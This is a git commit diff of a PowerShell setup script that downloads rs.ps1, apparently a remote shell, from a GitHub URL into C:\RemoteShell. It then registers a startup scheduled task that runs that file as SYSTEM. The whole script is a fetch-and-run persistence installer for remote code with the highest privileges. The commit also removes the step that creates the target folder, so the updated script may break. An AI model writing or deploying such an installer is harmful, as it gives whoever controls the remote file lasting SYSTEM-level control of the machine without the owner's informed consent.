434e170e47ae5ffc9c3ad043a5c508c37b3cebf7
fiveraptor <jorisbieg@gmail.com>
2023-06-13 21:00:06 +0200

    updated

--- setup.ps1
+++ setup.ps1
@@ -1,6 +1,12 @@
-$url='https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1'
-$ziel='C:\RemoteShell\rs.ps1'
-$w=New-Object Net.WebClient;if(!(Test-Path 'C:\RemoteShell')){md 'C:\RemoteShell'};$w.DownloadFile($url,$ziel)
+$url = "https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1"
+$zielSpeicherort = "C:\RemoteShell\rs.ps1"
+
+# Erstelle eine WebClient-Instanz
+$webClient = New-Object System.Net.WebClient
+
+# Lade die Datei herunter und speichere sie am gewünschten Speicherort
+$webClient.DownloadFile($url, $zielSpeicherort)
+
 
 Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)
 
